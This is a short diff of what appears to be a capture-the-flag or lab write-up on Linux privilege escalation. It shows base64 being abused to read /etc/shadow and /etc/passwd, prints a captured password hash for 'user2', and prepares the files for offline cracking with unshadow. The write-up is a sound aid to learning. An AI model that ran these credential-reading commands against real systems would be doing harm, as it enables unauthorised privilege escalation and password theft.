@@ -97,4 +97,6 @@ GTFObins has a one-liner that allows you to run commands in nmap as sudo (if you
 - Used base64 to encode then decode /etc/shadow
     - `base64 /etc/shadow | base64 --decode`
     - We get this password hash for user2: `$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/`
-- We can crack user2's hash using hashcat
+- To use `unshadow`, we need both *passwd* and *shadow*
+    - `base64 /etc/shadow | base64 --decode > shadow` and `base64 /etc/passwd | base64 --decode > passwd`
+
